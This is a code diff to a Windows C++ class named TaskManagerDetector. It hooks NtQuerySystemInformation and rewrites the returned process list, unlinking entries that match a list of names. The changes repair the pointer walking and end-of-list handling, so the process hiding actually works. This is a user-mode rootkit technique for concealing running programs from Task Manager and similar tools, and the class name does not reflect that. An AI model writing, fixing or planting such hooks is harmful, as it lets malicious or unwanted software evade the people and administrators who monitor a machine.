@@ -20,11 +20,10 @@ namespace
         HANDLE                  InheritedFromProcessId;
     } MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;
 
-    typedef NTSTATUS(__stdcall * CurNtQuerySystemInformation)(
-        IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
-        OUT PVOID SystemInformation,
-        IN ULONG SystemInformationLength,
-        OUT PULONG ReturnLength OPTIONAL);
+    using CurNtQuerySystemInformation = NTSTATUS(__stdcall *)(SYSTEM_INFORMATION_CLASS SystemInformationClass,
+                                                               PVOID SystemInformation,
+                                                               ULONG SystemInformationLength,
+                                                               PULONG ReturnLength);
 }
 
 CurNtQuerySystemInformation trueNtQuerySystemInformation = nullptr;
@@ -40,7 +39,7 @@ std::unique_ptr<TaskManagerDetector> & TaskManagerDetector::GetInstance()
 
 bool TaskManagerDetector::InstallHooks()
 {
-    CurNtQuerySystemInformation trueNtQuerySystemInformation = reinterpret_cast<CurNtQuerySystemInformation>(GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation"));
+    trueNtQuerySystemInformation = reinterpret_cast<CurNtQuerySystemInformation>(GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation"));
     if (!trueNtQuerySystemInformation)
     {
         return false;
@@ -54,14 +53,15 @@ bool TaskManagerDetector::InstallHooks()
     return true;
 }
 
-NTSTATUS TaskManagerDetector::NtQuerySystemInformationHook(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
+NTSTATUS __stdcall TaskManagerDetector::NtQuerySystemInformationHook(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
 {
-    NTSTATUS status = trueNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
     PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
     PMY_SYSTEM_PROCESS_INFORMATION pNext = NULL;
     bool findProcess = false;
     std::vector<std::wstring> processList;
     std::vector<PMY_SYSTEM_PROCESS_INFORMATION> newSystemInformation;
+
+    NTSTATUS status = trueNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 
     if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation)
     {
@@ -69,12 +69,15 @@ NTSTATUS TaskManagerDetector::NtQuerySystemInformationHook(SYSTEM_INFORMATION_CL
         {
             return status;
         }
-        pCurrent = reinterpret_cast<PMY_SYSTEM_PROCESS_INFORMATION>(SystemInformation);
-        std::wstring imageName;
-        while (pCurrent != 0)
+        pCurrent = nullptr;
+        pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;
+
+        do
         {
-            pNext = reinterpret_cast<PMY_SYSTEM_PROCESS_INFORMATION>((reinterpret_cast<PUCHAR>(pCurrent + pCurrent->NextEntryOffset)));
-            imageName = std::wstring(pCurrent->ImageName.Buffer, pCurrent->ImageName.Length);
+            pCurrent = pNext;
+            pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
+            findProcess = false;
+            std::wstring imageName = std::wstring(pNext->ImageName.Buffer, pNext->ImageName.Length / sizeof(wchar_t));
             for (const auto & processName : processList)
             {
                 if (toLowerW(processName).compare(toLowerW(imageName)) == 0)
@@ -83,13 +86,21 @@ NTSTATUS TaskManagerDetector::NtQuerySystemInformationHook(SYSTEM_INFORMATION_CL
                     break;
                 }
             }
+
             if (findProcess)
             {
-                pCurrent->NextEntryOffset += pNext->NextEntryOffset;
-                findProcess = false;
+                if (0 == pNext->NextEntryOffset)
+                {
+                    pCurrent->NextEntryOffset = 0;
+                }
+                else
+                {
+                    pCurrent->NextEntryOffset += pNext->NextEntryOffset;
+                }
+
+                pNext = pCurrent;
             }
-            pCurrent = reinterpret_cast<PMY_SYSTEM_PROCESS_INFORMATION>((reinterpret_cast<PUCHAR>(pCurrent + pCurrent->NextEntryOffset)));
-        }
+        } while (pCurrent->NextEntryOffset != 0);
     }
 
     return status;
